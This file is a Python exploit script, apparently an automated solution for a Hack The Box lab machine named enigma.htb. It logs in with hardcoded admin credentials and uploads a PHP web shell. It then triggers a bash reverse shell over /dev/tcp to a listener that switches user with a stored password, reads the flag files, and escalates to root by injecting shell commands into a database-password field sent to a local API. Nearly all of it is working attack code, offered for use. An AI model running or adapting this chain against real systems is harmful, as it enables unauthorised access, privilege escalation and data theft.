import socket
import threading
import time
import base64
import json
import requests

# ---- PART 1: Upload ----
def run_upload():
    session = requests.Session()

    # Login
    login_url = "http://support_001.enigma.htb/index.php?op=login"
    credentials = {
        "username": "admin",
        "password": "Ne3s4rtars78s"
    }
    session.post(login_url, data=credentials)

    # Upload
    upload_url = "http://support_001.enigma.htb/actions.php"
    with open("exploit.zip", "rb") as f:
        files = {"blob1": ("exploit.zip", f, "application/zip")}
        data = {"op": "save", "id_module": "14", "id_plugin": "48"}
        response = session.post(upload_url, files=files, data=data)

    if response.status_code == 200:
        print("[+] Upload successful")
    else:
        print(f"[-] Upload failed: {response.status_code}")

    LHOST = input("[*] Enter your IP: ").strip()
    LPORT = 4444

    print(f"[*] Using {LHOST}:{LPORT}")
    # Test
    test_url = f"http://support_001.enigma.htb/files/SHELL2.php?c=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{LHOST}%2F{LPORT}%200%3E%261%27"
    test_response = session.get(test_url)
    print(f"[*] Test status: {test_response.status_code}")
    print(f"[*] Test response: {test_response.text}")


# ---- PART 2: Listener ----
# Build the curl command with base64 encoded payload
payload = json.dumps({
    "bindingId": "backup_database",
    "arguments": [
        {"name": "db_user", "value": "backup_svc"},
        {"name": "db_pass", "value": "test' ; cat /root/*.txt > /tmp/root_flag.txt #"},
        {"name": "db_name", "value": "production"}
    ]
})
payload2 = json.dumps({
    "bindingId": "backup_database",
    "arguments": [
        {"name": "db_user", "value": "backup_svc"},
        {"name": "db_pass", "value": "test' ; rm /tmp/root_flag.txt #"},
        {"name": "db_name", "value": "production"}
    ]
})

encoded_payload = base64.b64encode(payload.encode()).decode()
encoded_payload2 = base64.b64encode(payload2.encode()).decode()
curl_command = f"echo {encoded_payload} | base64 -d | curl -X POST http://127.0.0.1:1337/api/StartAction -H 'Content-Type: application/json' -d @- > /dev/null 2>&1"

curl_command2 = f"echo {encoded_payload2} | base64 -d | curl -X POST http://127.0.0.1:1337/api/StartAction -H 'Content-Type: application/json' -d @- > /dev/null 2>&1"

AUTO_COMMANDS = [
    "su haris",
    "bestfriends",
    "echo FlagSnatching",
    "",   
    "",   
"echo '======= USER FLAG ======='",
"cat ~/user.txt",
"echo '========================='",
    curl_command,
"echo '======= ROOT FLAG ======='",
"cat /tmp/root_flag.txt",
"echo '========================='",
    curl_command2,
    "exit",
    "exit",
    "exit",

]


def handle_responses(client_socket):
    """Background thread to receive and print data from the client."""
    while True:
        try:
            data = client_socket.recv(4096)
            if not data:
                print("[-] Client disconnected.")
                break
            print(data.decode(), end="")
        except Exception as e:
            print(f"[-] Receive error: {e}")
            break


def send_auto_commands(client_socket, commands, delay=0.5):
    print(f"[*] Executing {len(commands)} automatic command(s)...")
    for cmd in commands:
        # print(f"[AUTO] >> {cmd}")  # remove this line entirely
        client_socket.send((cmd + "\n").encode())
        time.sleep(delay)
    print("[*] Automatic commands complete.")


def start_server(host="0.0.0.0", port=4444):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(1)
    print(f"[*] Listening on {host}:{port}")

    try:
        client_socket, client_address = server.accept()
        print(f"[+] Connection from {client_address[0]}:{client_address[1]}")

        response_thread = threading.Thread(target=handle_responses, args=(client_socket,), daemon=True)
        response_thread.start()

        auto_thread = threading.Thread(target=send_auto_commands, args=(client_socket, AUTO_COMMANDS), daemon=True)
        auto_thread.start()
        auto_thread.join()

        # Exit after auto commands complete instead of dropping to manual input
        print("[*] All done, shutting down.")
        client_socket.close()
        return                          # <-- exits start_server() cleanly

    except KeyboardInterrupt:
        print("\n[*] Shutting down server.")
    except Exception as e:
        print(f"[-] Server error: {e}")
    finally:
        server.close()

# ---- MAIN ----
if __name__ == "__main__":
    # Step 1: Start listener in background thread
    listener_thread = threading.Thread(target=start_server, daemon=True)
    listener_thread.start()
    print("[*] Listener started...")

    # Step 2: Wait a moment then run upload
    time.sleep(2)
    run_upload()

    # Step 3: Wait for listener to finish
    listener_thread.join()
